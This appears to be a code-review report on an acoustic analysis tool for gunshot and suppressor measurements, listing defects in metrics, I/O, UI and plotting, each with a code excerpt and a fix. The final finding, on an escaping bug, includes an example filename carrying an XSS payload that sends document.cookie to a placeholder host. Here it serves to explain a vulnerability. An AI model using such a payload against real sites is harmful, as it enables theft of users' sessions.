`metrics.py:257` · Acoustic Metrics · MIL-STD-1474E, Appendix D and ANSI S12.7-1986 (instrumentation bandwidth requirements for impulse noise measurement)

```python
rise_samples = max(0, i_90 - i_10)
    return rise_samples / sample_rate * 1e6  # microseconds
```

**Failure:** rise_samples is an integer, so the returned value can only be a multiple of 1e6/fs us: 20.83 us at 48 kHz, 10.42 us at 96 kHz, 5.21 us at 192 kHz. The docstring (metrics.py:224) and README.md:556/659 claim 'typical gunshot rise times: 1-50 us' and 'supersonic crack (~1 us)'. Measured at 48 kHz on synthetic Friedlander waves: a true 1 us rise reports 20.83 us (+1983%), 5 us reports 20.83 us (+317%), 10 us reports 20.83 us (+108%), 50 us reports 62.50 us (+25%). Below ~40 us the reported number is pure quantisation noise and carries no information about the shot. It is worse than quantisation alone: the recorder's own anti-alias filter bandlimits the signal, so the shortest rise physically present in a 48 kHz file is ~0.35/f_3dB ≈ 18 us — at 48 kHz the metric measures the RECORDER, not the weapon. The tool emits the number to CSV with one decimal place ('20.8') implying 0.1 us resolution.

**Fix:** (1) Linearly interpolate the 10% and 90% crossing instants between bracketing samples instead of returning an integer sample count. (2) Set a quality flag and print a warning when the reported rise time is within ~3 sample periods of the resolution limit, naming the limit ('rise time 20.8 us equals the 48 kHz sample period; this measures the recorder, not the weapon'). (3) Round the CSV output at main.py:357 to the achievable resolution rather than unconditionally to 0.1 us, and document the minimum defensible sample rate in the README. Interpolation is only worth doing after the onset-anchoring fix — interpolating a crossing found on the wrong lobe buys nothing.


### Both detectors initialise state = 0.0, so the pre-trigger portion of every per-shot level curve is a filter charge-up ramp, not a level; LZS never converges inside a 250 ms window

`metrics.py:167` · Acoustic Metrics · IEC 61672-1:2013 clause 5.7 (time-weighted levels are the output of a continuously running detector)

```python
state = 0.0
    for i in range(n):
```

**Failure:** Each shot window is filtered independently starting from an empty detector. Measured at 96 kHz on a 250 ms window with a genuine 60.0 dB ambient in the 50 ms pre-trigger: LZF[0] reads -0.8 dB (60.8 dB low), LZF at t=10 ms reads 48.7 dB (11.3 dB low), and LZF at t=40 ms — still inside the pre-trigger — reads 54.3 dB (5.7 dB low). The Slow detector is worse: LZS[0] = -9.8 dB and LZS at t=40 ms = 45.8 dB, 14.2 dB below the true ambient, and with tau = 1 s against a 250 ms window it never converges at all. These arrays are stored in ShotMetrics.LAF/LAS/LZF/LZS (metrics.py:549-553) and plotted, so every per-shot level-curve plot shows a spurious ~60 dB rise across the pre-trigger that an operator will read as the shot 'building'. Any attempt to read the pre-shot ambient off that plot is 5-15 dB low. LAFmax/LASmax themselves are not materially affected while the shot dominates the ambient by tens of dB, but they become wrong as soon as the pre-trigger contains real content (a preceding shot's tail, a second shooter).

**Fix:** Initialise the detector from the measured pre-trigger ambient: ms0 = mean(x_squared over the first few ms of the pre-trigger), then scipy.signal.lfilter_zi([a],[1,-(1-a)]) * ms0 as zi (this pairs naturally with the lfilter conversion above). The 'run the detector once over the whole recording and slice' alternative is correct in principle but conflicts with the chunked-processing path (main.py MAX_DURATION_FULL_LOAD_S / CHUNK_DURATION_S) and is a larger change — prefer ambient initialisation. Either way, mark or clip the first 3·tau of the plotted curve at plots.py:585-593 so a Slow curve (tau = 1 s in a 250 ms window, which never converges) is never displayed as a measurement.


### SEL is integrated over the whole extraction window, so LAE/LZE/LCE change with post_shot_ms and truncate reverberant tails

`metrics.py:389` · Acoustic Metrics · ISO 1996-1 / IEC 61672-1 (sound exposure level; the integration interval must be stated and must capture the event)

```python
# Integrate squared pressure
    dt = 1.0 / sample_rate
    energy = np.sum(pressure_Pa ** 2) * dt
```

**Failure:** The integration limits are the shot_detect window (window_start = idx - pre_samples, window_end = min(n, idx + post_samples), shot_detect.py:285-286), i.e. a fixed 50 ms + 200 ms box, not a signal-defined interval. Consequence 1 — truncation: measured at 96 kHz on a synthetic shot plus a reverberant tail, LZE at post=200 ms vs the full tail is 110.16 vs 110.17 dB at RT60=0.4 s (negligible), 114.07 vs 114.21 dB at RT60=0.8 s (0.14 dB), and 118.42 vs 119.25 dB at RT60=1.6 s (0.83 dB). At an indoor range 0.83 dB is the same order as the differences between competing cans. Consequence 2 — operator-dependence: post_shot_ms is a documented CLI/config knob (AnalysisConfig.post_shot_ms, main.py:89), so two runs of the same file with different settings produce different LAE, with no cross-check in the output that the windows matched. Consequence 3 — the last shot in a file is silently truncated by `min(n, ...)`, giving it a shorter integration than every other shot with no flag. Credit where due: the window length IS recorded (duration_ms in metrics_summary.csv, main.py:327/345, and duration_s in ShotMetrics.to_dict), so the truncation is at least auditable after the fact.

**Fix:** Define the integration interval from the signal — integrate from onset until the backward-cumulative energy reaches 99% of the window total, or to the -20 dB envelope point plus a documented tail — and add `sel_integration_ms` and `sel_energy_captured_pct` fields to ShotMetrics, to_dict() and the CSV fieldnames (main.py:333). Set a `truncated` flag when window_end hits the min(n, ...) clamp at shot_detect.py:286 or when the captured-energy fraction falls below a threshold, and exclude or separately report truncated shots in compute_aggregate_metrics rather than mixing integration intervals in one energy average.


### MP3/AAC/OGG/WMA inputs are accepted and reported to 0.1 dB with no warning

`FileSelector.py:30` · Pipeline & I/O · IEC 61672-1 §5.4 (measurement chain frequency response and linearity)

```python
AUDIO_EXTS = [
    ".mp3", ".wav", ".flac", ".aac", ".m4a", ".ogg", ".opus", ".wma", ".aiff", ".alac",
]
```

**Failure:** main.py:1126 only warns when the suffix is NOT in this list, so an .mp3 is accepted without comment. A 128 kbps MP3 of a gunshot has codec pre-echo smearing the shock front across the ~26 ms MDCT window and decoder overshoot that can exceed the original peak; SASA reports rise_time_us (wrong by an order of magnitude), Lpeak_Z (wrong by several dB, possibly high) and 1/3-octave levels above the codec cutoff (all zeros) as valid measurements to one decimal place.

**Fix:** Split into PCM_EXTS ('.wav','.flac','.aiff','.aif','.w64','.caf') and LOSSY_EXTS; refuse lossy input unless `--allow-lossy` is passed, and when allowed set `lossy_source: true` in analysis_metadata.json plus a banner on every plot. Better still, key the check on sf.info().subtype/format rather than the file extension, since an extension says nothing about a container's actual codec.


### Every numeric UI parameter is dropped when the user enters 0, and a blank field silently becomes the default

`app.py:791` · Pipeline & I/O

```python
if config.get('thresholdDb'):
                ac_kwargs['detection_threshold_dB'] = float(config['thresholdDb'])
```

**Failure:** Both layers use truthiness. app.js:170 does `parseFloat($('#threshold-db').value) || 120`, so a user typing 0 gets 120; a blank field yields NaN, which JSON-serialises to null and is then dropped by `config.get(...)` in app.py, again yielding the default. Concretely: an operator clears "Pre-shot (ms)" intending 0 ms of pre-trigger and the run uses 50 ms, so the integration window — and therefore LAE — differs from what the UI displays. The Node bridge repeats the bug (ui/bridge/python-bridge.js:51, `if (config.thresholdDb)`). In every case the UI shows one number and the analysis uses another, with no message.

**Fix:** Switch app.py:780-808 to `if config.get('x') is not None and isinstance(config['x'], (int, float)) and math.isfinite(config['x'])`, and in app.js build the config with Number.isFinite() guards, omitting the key when the field is blank instead of substituting a default. Show a validation error for a non-numeric entry rather than silently defaulting, and echo the effective AnalysisConfig back over the WebSocket for display.


### Upload endpoint reads and then copies the entire file in memory — a 30-minute 192 kHz WAV needs ~6 GB

`app.py:521` · Pipeline & I/O

```python
content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
```

**Failure:** A 30-minute 192 kHz 24-bit stereo WAV is 2.07 GB. `self.rfile.read()` allocates 2.07 GB; `parse_multipart` then does `body.split(b'--' + boundary)` (app.py:420), allocating another ~2.07 GB, and `dest.write_bytes(file_data)` holds a third copy — ~6 GB peak before analysis even starts, typically ending in MemoryError, an aborted connection and an "Upload failed" toast with no diagnostic. A malformed Content-Length header also makes `int()` raise, killing the handler thread with an unhandled exception.

**Fix:** Stream the request body to a temp file in fixed-size chunks and parse the multipart boundaries incrementally (or require the client to POST the raw bytes with the filename in a header and skip multipart entirely, since there is only one field). Enforce a configurable max upload size and return 413 above it, and wrap the Content-Length parse in try/except returning 400. Downgraded from high: the failure is a failed upload with a clear cause, not corrupted data — the operator can also use the 'enter file path' box, which bypasses upload entirely.


### A running analysis cannot be cancelled and completion is lost if the WebSocket reconnects

`app.py:729` · Pipeline & I/O

```python
if msg.get('type') == 'run-analysis':
            config = msg.get('config', {})
            threading.Thread(
                target=self._run_analysis_inprocess,
                args=(sock, config),
                daemon=True,
            ).start()
```

**Failure:** Only 'run-analysis' is handled — there is no 'cancel' message, no cancellation token threaded into `analyze_file`, and no way to stop a 30-minute job short of killing the process. Worse, the analysis thread captures `sock`; if the browser tab reloads or the socket drops (app.js:145 auto-reconnects on close), `_ws_send` swallows BrokenPipeError (app.py:742), so the terminal 'complete' message goes nowhere: the analysis finishes and writes its output directory, but the UI stays in "Running..." forever and never loads the results. Progress itself is regexed out of stdout `[n/m]` markers (app.py:299), so it jumps 67% -> 83% and then sits at 83% for the entire multi-minute plotting stage.

**Fix:** Keep a module-level {job_id: {'event': threading.Event(), 'sockets': set()}} registry; broadcast log/progress/complete to all sockets registered for the job so a reconnecting client recovers; accept a 'cancel' message that sets the Event, and check it between pipeline stages and inside the per-shot loops in analyze_file/_analyze_file_chunked. Write a status.json into the output directory so a reload can resolve state. Replacing the stdout scrape with an explicit progress callback is the right long-term fix but is a larger refactor.


### Analysis redirects the process-global sys.stdout, so two concurrent runs cross-wire logs and can leave stdout broken

`app.py:826` · Pipeline & I/O

```python
sys.stdout = captured_stdout
            sys.stderr = captured_stdout  # Also capture stderr
```

**Failure:** The Run button is disabled per-tab, but the server accepts 'run-analysis' from any WebSocket. Open SASA in two browser tabs and start a run in each: both threads assign the process-global `sys.stdout`, so tab A sees tab B's per-shot dB lines interleaved into its own log, and whichever thread finishes second restores `old_stdout` — which for that thread is the *other* thread's WebSocketStdoutCapture, leaving stdout permanently bound to a dead socket wrapper for the life of the server.

**Fix:** Guard analyses with a module-level threading.Lock acquired non-blocking; on failure reply {'type':'error','message':'An analysis is already running'}. That alone removes the interleaving and the restore-ordering corruption. Replacing the stdout hijack with a logging handler or an explicit callback into analyze_file is the cleaner fix but touches every print() in main.py.


### UI accepts .mts/.mxf but the server's VIDEO_EXTS omits them, sending camcorder files straight to the WAV loader

`app.py:156` · Pipeline & I/O

```python
VIDEO_EXTS = {'.mp4', '.mkv', '.mov', '.avi', '.wmv', '.flv', '.webm', '.m4v', '.mpeg', '.mpg'}
```

**Failure:** index.html:71 advertises `accept=".wav,.flac,.aiff,.aif,.mp4,.mkv,.mov,.avi,.mts,.mxf"`. An operator drops a Sony .MTS from a camcorder; app.py:833 finds `.mts` not in VIDEO_EXTS, skips extraction, and `analyze_file` hands the transport stream to soundfile, producing an opaque "File contains data in an unknown format" toast.

**Fix:** Define VIDEO_EXTS once (FileSelector.py) and import it in app.py instead of redeclaring, extend it with .mts/.m2ts/.mxf/.mpg/.ts, and generate the HTML accept attribute from the same source at server start rather than hard-coding it. Falling back to an ffprobe probe for unrecognised suffixes is a good secondary, but the shared-constant fix is what actually closes the gap.


### metrics_summary.csv has no shot time, no units in headers, and no calibration/provenance rows

`main.py:327` · Pipeline & I/O · ISO 80000-8 (level quantities must state their reference); IEC 61672-1 §5.2

```python
fieldnames = [
        'shot_number', 'duration_ms',
        'Lpeak_Z', 'Lpeak_A', 'Lpeak_C',
        'LAE', 'LZE', 'LCE',
```

**Failure:** A customer receives metrics_summary.csv showing `3,250.0,161.4,...`. There is no `time_s` column, so row 3 cannot be located in the recording, cross-checked against video, or excluded if it was a squib or an adjacent shooter. `Lpeak_Z` carries no unit or reference, so a reader cannot distinguish dB SPL re 20 uPa from dB re FS; `crest_factor_dB` and `kurtosis` have no stated definition. The calibration, threshold and window lengths that produced the numbers live in a different file. `ShotEvent.time_s` is available and written to the JSON (main.py:374) but deliberately omitted from the CSV.

**Fix:** Change save_csv_summary's signature to take the shots list alongside shot_metrics and add `time_s` and `peak_Pa` columns; rename level headers to carry the reference (Lpeak_Z_dB_SPL_re20uPa, LAE_dB_re_20uPa2s). Prefer a sidecar `metrics_schema.json` over commented '#' provenance lines — comment lines break naive spreadsheet/pandas imports, which is the format's whole purpose. Downgraded from high: no reported value is wrong, this is a traceability/usability gap.


### analysis_metadata.json omits software version, detection settings, window lengths, channel count, bit depth and input hash

`main.py:153` · Pipeline & I/O · ISO/IEC 17025 §7.5 (records must permit repetition of the measurement)

```python
def to_dict(self) -> Dict:
        """Convert to dictionary for JSON serialization."""
        return {
            'input_file': str(self.input_file),
            'output_dir': str(self.output_dir),
            'calibration': {
```

**Failure:** A customer disputes a reported 138.2 dB Lpeak. analysis_metadata.json — the only machine-readable result, and the only file /api/results and the History view read — records the input path, Pa_per_FS, sample rate, duration, shot count, metrics and a timestamp. It does not record the detection threshold, pre/post window, nperseg/noverlap, whether the chunked path was taken (which changes windows near boundaries), the channel count averaged, the source bit depth, or any hash of the input. There is no `__version__` in any Python module (grep confirms; the UI hard-codes "v1.0" at index.html:48), so the build cannot be identified. The result is unreproducible and the input cannot be proven to be the file measured.

**Fix:** Add a `__version__` to a single module and a `software` block (version, git commit if available, numpy/scipy/soundfile versions) plus an `input` block (SHA-256, size, sf.info frames/channels/subtype/samplerate) and `analysis: {chunked: bool, config: <AnalysisConfig dict>}` to AnalysisResult.to_dict. Folding config.json into the JSON is a consolidation, not a new capability — do not claim the settings are currently unrecorded.


### No test-condition metadata is captured at all, so the output cannot function as a measurement record

`main.py:76` · Pipeline & I/O · MIL-STD-1474E §5.2 and Table VI (required test documentation); ISO/IEC 17025 §7.8.2

```python
@dataclass
class AnalysisConfig:
    """Configuration for acoustic analysis."""
    # Calibration
    # Default: derived from calibrated 114 dB SPL tone (Audio/260212_0010-1.wav)
```

**Failure:** A defensible suppressor report requires mic model and serial, preamp/recorder model and serial, mic distance/angle/height from the muzzle, ground surface, weapon, barrel length, ammunition lot, temperature, humidity, barometric pressure, wind, date/time of firing, operator, calibrator model and level, and pre/post-test drift. AnalysisConfig captures exactly one free-text field (`calibration_description`) and the UI exposes one optional text box (index.html:138). Given two output directories showing 131.4 dB and 138.9 dB, nothing in either records whether the mic was 1 m left of the muzzle or 3 m behind it — so the difference is unattributable and neither number is admissible as evidence of suppressor performance.

**Fix:** Add an optional `test_metadata: Dict[str, Any]` field to AnalysisConfig (free-form dict plus a documented recommended key set: mic model/serial, distance_m, azimuth_deg, height_m, ground, weapon, barrel_length_in, ammunition, temperature_C, humidity_pct, pressure_kPa, wind_mps, operator, test_datetime), echo it verbatim into analysis_metadata.json and onto plot footers, and surface it as a collapsible UI section. Do NOT make it required or gate the run on it — that would break every existing CLI invocation and the batch use case. This should be reclassified as an upgrade, and severity reduced from critical since nothing currently computes a wrong value.


### Default 120 dB envelope threshold fails to detect suppressed subsonic shots — the product's primary use case

`main.py:88` · Pipeline & I/O

```python
# Shot detection
    detection_threshold_dB: float = 120.0
```

**Failure:** The threshold is applied to a 1 ms RMS envelope (shot_detect.py:248-262), which for an impulsive muzzle blast sits roughly 10-20 dB below the instantaneous peak; shot_detect.py:213-214 states "Typical gunshots: 140-170 dB peak, so 100-120 dB envelope". A suppressed .22LR at 1 m peaks near 115-120 dB, giving a 1 ms envelope near 100-105 dB — below the 120 dB default. Running SASA with defaults on a suppressed .22 recording prints "No shots detected", exits 0, and writes an output directory whose JSON claims Lpeak_Z_max 0.0 dB.

**Fix:** Expose the existing threshold_relative_dB through AnalysisConfig/argparse/UI and make the default adaptive: measure the file's noise floor (e.g. 10th-percentile envelope) and peak envelope at step [1/6], set the threshold to max(noise_floor + 20 dB, peak - 30 dB) when the user did not specify one, and always print noise floor, peak and effective threshold. Keep the absolute threshold available for repeatability across a test series.


### `--config` discards every other CLI flag without warning

`main.py:1076` · Pipeline & I/O

```python
if args.config is not None:
        config = AnalysisConfig.from_json(args.config)
    else:
```

**Failure:** `python main.py rec.wav --config site_cfg.json --Pa-per-FS 80.0 --threshold-dB 100` runs with the Pa/FS and threshold from site_cfg.json; the two explicitly supplied flags are silently ignored, and the operator sees the config-file calibration only in the [2/6] log line. Every reported dB is then computed with a calibration the operator explicitly overrode.

**Fix:** Load the config file as a base, then overlay only flags the user actually passed. Detect that by giving the argparse arguments `default=argparse.SUPPRESS` and checking `hasattr(args, name)`, or by parsing twice against a sentinel-default parser. Print the merged effective configuration before running, and error (not silently ignore) if a config key is unknown.


### Output directories are keyed to one-second resolution with exist_ok=True, so a re-run overwrites and mixes results

`main.py:310` · Pipeline & I/O

```python
def create_output_directory(base_dir: Path, input_file: Path) -> Path:
    """Create timestamped output directory."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    dir_name = f"{input_file.stem}_{timestamp}"
    output_dir = base_dir / dir_name
    output_dir.mkdir(parents=True, exist_ok=True)
```

**Failure:** Re-running the same file within the same second (a batch loop, or two clients) reuses the directory, and stale artefacts survive regardless of timing. Run 1 detects 5 shots and writes shots/shot_01..shot_05_summary.png; run 2 with a higher threshold detects 3 and overwrites 01-03, leaving 04 and 05 behind. The UI pairs images to metrics positionally (app.js:357, `state.shotImages[idx]` against `agg.shots[idx]`), so the operator browsing the results sees run 1's plot beside run 2's metrics.

**Fix:** Use exist_ok=False in create_output_directory and retry with a `_2`, `_3` suffix (or append a short uuid) on FileExistsError. Independently, record each shot's image filename in analysis_metadata.json and have app.js look it up by shot number instead of by array position — that fixes both this and the >99-shot ordering bug.


### A video passed as a CLI argument is never extracted — extraction only happens in the interactive picker branch

`main.py:1109` · Pipeline & I/O

```python
# Handle video files
        if wav_path.suffix.lower() in VIDEO_EXTS:
            if not _VIDEO_SUPPORT:
```

**Failure:** The video-extraction block sits inside the `else:` branch that runs only when no input argument was given (main.py:1101). `python main.py range_day.mov` therefore skips extraction, prints only "Warning: .mov may not be a supported audio format" (main.py:1127), then fails inside soundfile with "Error opening ...: File contains data in an unknown format." and exits 1 — while the same file selected through the picker works.

**Fix:** Hoist the video branch to run on wav_path after both input paths converge (i.e. immediately before the AUDIO_EXTS check at main.py:1126). Prefer app.py's _find_ffmpeg fallback chain over the moviepy hard dependency, and fix the same 44.1k/16-bit/mono destruction in whichever extractor the CLI ends up calling.


### `--formats` is split on commas with no trimming or validation, so a space aborts the run mid-pipeline

`main.py:1092` · Pipeline & I/O

```python
plot_formats=args.formats.split(','),
```

**Failure:** `--formats "png, pdf"` yields ['png', ' pdf']. plots.py:852 builds `output_path.with_suffix('. pdf')` (pathlib accepts it — verified) and matplotlib then raises `ValueError: Format ' pdf' is not supported`. Because plots run before the data files are written, the whole analysis aborts and no CSV/JSON is produced. Any unsupported token behaves the same.

**Fix:** Normalise at parse time — `plot_formats=[f.strip().lower() for f in args.formats.split(',') if f.strip()]` — and validate in AnalysisConfig.__post_init__ against matplotlib.pyplot.gcf().canvas.get_supported_filetypes(), raising before any audio is loaded. Apply the same normalisation to app.py:808 `config['formats'].split(',')`.


### Silent `except: pass` blocks drop waveform data, disable the chunked path, and emit shots with missing band data as valid

`main.py:292` · Pipeline & I/O

```python
try:
            t_full, p_full = get_region(a, b)
            if len(t_full) > 0:
                out_t.append(t_full)
                out_p.append(p_full)
        except Exception:
            pass
```

**Failure:** (a) If a `load_wav_chunk` read for a shot region fails (a transient I/O error on a network path — this repository itself lives on Google Drive), that shot's full-resolution waveform segment is silently omitted and the interactive HTML draws a straight line through the shot, which reads as "no event here". (b) main.py:772 `except Exception: pass` around `get_wav_info` means any probe failure silently disables the chunked path and falls through to a full load of a file that may be hours long. (c) metrics.py:515 catches band-analysis failure, prints a warning into a log pane nobody reads, and still emits the shot as a complete record with `band_exposure_dB: []`; the UI's `drawBandChart` returns early (app.js:373), leaving a blank canvas with no explanation.

**Fix:** Thread a warnings list through analyze_file/_analyze_file_chunked, append (stage, shot_number, exception repr) at each of the three sites instead of pass/print, write it into analysis_metadata.json, and render it in the results header. Add a per-shot `bands_ok: bool` to ShotMetrics.to_dict and the CSV so a shot with failed band analysis is identifiable rather than indistinguishable from one with no bands requested.


### `pip install .` fails, and the declared `sasa` console script points at a function that does not exist

`pyproject.toml:3` · Pipeline & I/O

```python
build-backend = "setuptools.backends._legacy:_Backend"
...
sasa = "main:cli_main"
```

**Failure:** `setuptools.backends` is not a module in any setuptools release (valid values are `setuptools.build_meta` and `setuptools.build_meta:__legacy__`), so `pip install .` dies with ModuleNotFoundError before building. If the backend is fixed, the installed `sasa` console script still fails at first invocation with `AttributeError: module 'main' has no attribute 'cli_main'` — grep across the repository finds no `cli_main` definition; main.py defines `main()`. `app` is also absent from `[tool.setuptools] py-modules`, so the installed distribution cannot start the UI at all.

**Fix:** Set build-backend = "setuptools.build_meta"; change the script to `sasa = "main:main"` and add `sasa-ui = "app:main"` (confirm app.py defines main() before wiring it); add "app" to py-modules. Note that even after this, the console script will import FileSelector at module load, which raises RuntimeError when tkinter is unavailable (FileSelector.py:19-27) — that import should be made lazy for a pip-installed CLI to work headless.


### plot_waveform_pa draws a right-hand 'Level (dB SPL)' axis that has no functional relationship to the plotted pressure trace

`plots.py:250` · UI & Presentation

```python
if show_dB_secondary:
        ax2 = ax.twinx()
        ...
        p_max = max(abs(np.min(pressure_Pa)), abs(np.max(pressure_Pa)))
        if p_max > 0:
            dB_max = float(amplitude_to_dB_SPL(p_max))
            dB_min = max(0.0, dB_max - 80)
            ax2.set_ylim(dB_min, dB_max + 5)
            ax2.set_ylabel('Level (dB SPL)', color=_TEXT_MUTED)
```

**Failure:** ax2 is a LINEAR axis spanning dB_min..dB_max+5 over the same pixel height as the bipolar Pascal axis, and nothing is ever plotted on it. dB SPL is logarithmic in pressure, so the mapping is wrong everywhere except coincidentally at the top. Worse, the left axis is symmetric about zero, so the dB axis midpoint lands at 0 Pa, where the true SPL is minus infinity. Concretely: a waveform peaking at 200 Pa is annotated dB_max = 140 dB; a rarefaction trough at -200 Pa sits at the bottom of the frame and is labelled 60 dB, and the zero crossing is labelled 100 dB. Any reader who takes a level off this axis — and it is labelled exactly as if they should — gets a fabricated number. This figure is the 'Overview' tab and the top panel of every PNG deliverable.

**Fix:** Delete the secondary axis (plots.py:250-264) or change the default `show_dB_secondary: bool = True` at plots.py:209 to False. If a level reference is wanted, draw individual horizontal reference lines at fixed Pa values, each annotated with its own amplitude_to_dB_SPL value, rather than any continuous dB axis against a linear pressure trace.


### All figures are saved with a near-black #08080c background — unusable as a printed or customer-facing deliverable

`plots.py:853` · UI & Presentation

```python
fig.savefig(path, dpi=dpi, bbox_inches='tight',
                    facecolor=fig.get_facecolor(), edgecolor='none')
```

**Failure:** setup_plot_style() sets figure.facecolor #08080c and axes.facecolor #12121a, and save_figure explicitly preserves them. A 12x5-inch PNG or PDF at 200-300 dpi is therefore an almost-solid black rectangle. Dropped into a Word/PDF customer report it (a) consumes an enormous amount of toner and looks like a printing fault, (b) makes the axis text — already at #8888a0/#555568 — vanish when a printer driver lightens the page, and (c) is unreadable on any monochrome laser printer because the magma/inferno dark end collapses. There is no light variant and no `--theme` switch anywhere in plots.py.

**Fix:** Parameterise: `setup_plot_style(theme='light'|'dark')` swapping the module-level colour constants, default the file outputs to a light report palette while the Plotly HTML the UI embeds stays dark, and expose --theme on the CLI plus a UI control. Keep magma/inferno — they are perceptually uniform and CVD-safe — but check the dark end of the ramp against white paper.


### No figure carries provenance — no timestamp, source file, calibration, sample rate, operator or software version

`plots.py:682` · UI & Presentation

```python
fig.suptitle(title, fontsize=14, fontweight='bold', color=_TEXT_PRIMARY)
```

**Failure:** create_shot_summary_figure's only identifying text is "Shot 3 Analysis". Once shot_03_summary.png is pulled out of its directory and pasted into a customer report or an email, there is no way to establish which recording, which weapon/suppressor, which microphone, which calibration constant, or which software build produced it. A customer or a reviewer cannot audit the number, and the vendor cannot defend it. main.py passes the filename into the full-recording titles but the per-shot figures — the ones most likely to be circulated — get nothing.

**Fix:** Add a small `fig.text(0.01, 0.005, provenance, fontsize=7, color=_TEXT_MUTED)` footer to create_shot_summary_figure and the full-recording figures, built from a single helper that formats source filename, ISO-8601 analysis timestamp, sample rate, Pa/FS + cal description, and the detection parameters. Pass it in from main.py where all of those are already available. Version/git-hash stamping is worthwhile but needs a version source that does not exist yet (index.html:48 hardcodes 'v1.0').


### 1/3-octave exposure bars are drawn from a 0 dB baseline, which is an arbitrary reference and visually compresses real differences

`plots.py:514` · UI & Presentation

```python
x = np.arange(len(center_frequencies))
    ax.bar(x, band_exposure_dB, color=_ACCENT, alpha=0.85,
           edgecolor=_BG_ELEVATED, linewidth=0.5)
```

**Failure:** matplotlib autoscales a positive bar chart from y=0. Band SELs of 138 and 108 dB — a 1000x energy ratio and the single most important spectral signature of a suppressor — render as bars of 100% and 78% height, reading as a modest difference. Worse, the 0 baseline implies zero acoustic energy at the axis origin, which is false: 0 dB is 20 uPa. The same construction is repeated in create_shot_summary_figure panel 5 (line 630).

**Fix:** Set an explicit ylim floored below the data (e.g. floor((min-5)/10)*10 to ceil((max+5)/10)*10) in both plot_band_exposure and create_shot_summary_figure panel 5, matching what app.js:394-395 already does so the PNG and the canvas chart agree. A step/line presentation is the conventional form for band spectra and is a reasonable follow-on.


### The progress bar can never move: the bridge parses a [NN%] marker that main.py never emits

`ui/bridge/python-bridge.js:104` · UI & Presentation

```python
// Parse progress hints
          const progressMatch = line.match(/\[(\d+)%\]/);
          if (progressMatch) {
            this.emit('progress', parseInt(progressMatch[1]));
          }
```

**Failure:** `grep '%]' main.py` returns nothing. main.py emits step markers of the form `[5/6] Generating plots...`, not percentages. The percent regex therefore never matches, so `progress` is never emitted, `progressFill.style.width` stays at 0% and `#progress-pct` reads "0%" for the entire run. On a 60-second recording the per-shot STFT loop (main.py:948-967) can run for many minutes while the UI shows a frozen 0% bar — the operator cannot distinguish "working" from "hung" and will kill the process. On completion the bar snaps 0% -> 100% (app.js:130-132), so the progress indicator never conveys information.

**Fix:** Parse the markers that already exist rather than adding new ones: in python-bridge.js replace the percent regex with `const m = line.match(/^\[(\d+)\/(\d+)\]/); if (m) this.emit('progress', Math.round(100*(+m[1]-1)/+m[2]));` and emit the stage text alongside it so the UI can show 'Generating plots...' instead of a bare number. Optionally interpolate inside the per-shot loop (main.py:948-967) using the shot count already known at main.py:813. Show elapsed time next to the percentage.


### There is no way to abort a running analysis; PythonBridge.cancel() exists but is never wired to anything

`ui/bridge/python-bridge.js:144` · UI & Presentation

```python
cancel() {
    if (this.process) {
      this.process.kill('SIGTERM');
      this.process = null;
    }
  }
```

**Failure:** `grep -n cancel ui/server.js ui/renderer/app.js` returns nothing — cancel() is dead code. An operator who selects the wrong 45-minute file, or realises the threshold was set to 60 dB and 4,000 false shots are being plotted one figure at a time (main.py:948-967), cannot stop it. The only escape is killing the terminal running `node ui/server.js`, which also loses the WebSocket and leaves partial output in Audio/analysis. Meanwhile the Run button turns `--danger` red (styles.css:545) while disabled, which reads as a Stop affordance that does nothing when clicked.

**Fix:** Store the bridge per connection in server.js (`ws._bridge = bridge`), accept `{type:'cancel'}` in the ws message handler, call bridge.cancel() and reply `{type:'cancelled'}`; handle that in app.js by calling analysisFinished(). Replace the red-pulsing disabled Run button with a separate enabled Abort button plus a spinner. Mark or delete the partial output directory on cancel so it cannot be mistaken for a completed measurement.


### Falsy-zero coercion silently rewrites user-entered 0 values for threshold, refractory, pre-shot and post-shot windows

`ui/renderer/app.js:170` · UI & Presentation

```python
thresholdDb: parseFloat($('#threshold-db').value) || 120,
      refractoryMs: parseFloat($('#refractory-ms').value) || 200,
      preMs: parseFloat($('#pre-ms').value) || 50,
      postMs: parseFloat($('#post-ms').value) || 200,
```

**Failure:** Operator sets "Pre-shot (ms)" to 0 to make the analysis window start exactly at the trigger sample. `parseFloat('0') || 50` evaluates to 50. The analysis runs with a 50 ms pre-window, the UI keeps showing "0" in the field, and the resulting B-duration/rise-time integration window is 50 ms wider than the operator believes. Same for refractory 0 (used to disable refractory gating) and threshold 0 dB. python-bridge.js:51-62 repeats the bug with `if (config.thresholdDb)`, so even a correctly-passed 0 is dropped.

**Fix:** In app.js parse once per field: `const n = parseFloat(el.value); if (!Number.isFinite(n)) { flagInvalid(el); return; } config.x = n;`. In python-bridge.js use `Number.isFinite(config.x)` for thresholdDb/refractoryMs/preMs/postMs/nperseg/paPerFS/sensitivityMv/vPerFS. Add min/step to the four number inputs in index.html:152-168.


### If the Python backend or the Node server dies mid-run, the UI stays stuck on "Running..." forever with no error

`ui/renderer/app.js:145` · UI & Presentation

```python
ws.onclose = () => setTimeout(connectWS, 2000);
    state.ws = ws;
```

**Failure:** main.py raises MemoryError on a 4 GB WAV, or the operator's laptop sleeps and the socket drops. `onclose` fires. Nothing resets `state.isRunning`, nothing restores the Run button text, nothing toasts. The button stays red-pulsing (`btn-run.running`, styles.css:544) with `disabled=true` and the label "Running...", the progress bar stays frozen at whatever it showed, and the log pane stops without a terminator. The operator has no way to recover except reloading the page. There is no `ws.onerror` handler at all, and the reconnect loop retries silently forever with no "Disconnected" indicator.

**Fix:** In onclose: if (state.isRunning) { analysisFinished(); logOutput.textContent += '\n--- Connection to analysis backend lost ---\n'; } plus a persistent (not auto-dismissing) error banner. Add ws.onerror. Render a connection-status chip in the sidebar footer driven by readyState with exponential backoff instead of the fixed 2 s retry.


### esc() does not escape double quotes, and its output is interpolated into an HTML attribute in the history list

`ui/renderer/app.js:572` · UI & Presentation

```python
<div class="history-item" data-path="${esc(entry.path)}">
```

**Failure:** `esc()` (app.js:530-534) sets textContent and reads innerHTML, which escapes &, < and > but NOT `"` or `'`. Uploads preserve the original filename verbatim (server.js:33) and main.py:313 builds the output directory as `f"{input_file.stem}_{timestamp}"`. A recording named `test" onmouseover="fetch('http://x/'+document.cookie)".wav` produces a directory whose path contains a double quote, which closes the `data-path` attribute and injects an event handler into the History view. Even without malice, any legitimate filename containing a quote (common in exported field notes) breaks the item so clicking it loads the wrong or no directory.

